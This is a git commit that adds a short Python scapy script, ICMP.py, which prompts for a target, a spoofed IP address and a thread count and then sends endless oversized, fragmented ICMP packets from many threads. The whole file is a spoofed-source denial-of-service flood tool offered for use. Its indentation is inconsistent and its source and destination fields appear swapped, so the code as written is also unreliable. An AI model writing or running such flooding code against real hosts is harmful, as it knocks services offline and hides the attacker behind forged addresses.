3d31d9aa31ae880ab35cd09b02a429dc0e521253
Law <36631640+LawOfTime@users.noreply.github.com>
2018-09-12 17:08:09 +0100

    ICMP.py

---
+++ ICMP.py
@@ -0,0 +1,21 @@
+import threading
+from scapy.all import *
+
+try:
+	ip = raw_input("Target: ")
+  altIP = raw_input("Spoofed IP: ")
+	threads = input("Threads: ")
+
+	def icmpflood():
+		try:
+			while True:
+				packet = IP(src=ip, dst=altIP)/ICMP()/("Z" * 65535)
+				send(fragment(packet), loop=1, verbose=0)
+		except:
+			pass
+
+	for i in range(int(threads)):
+		thread = threading.Thread(target=icmpflood)
+		thread.start()
+except:
+	pass
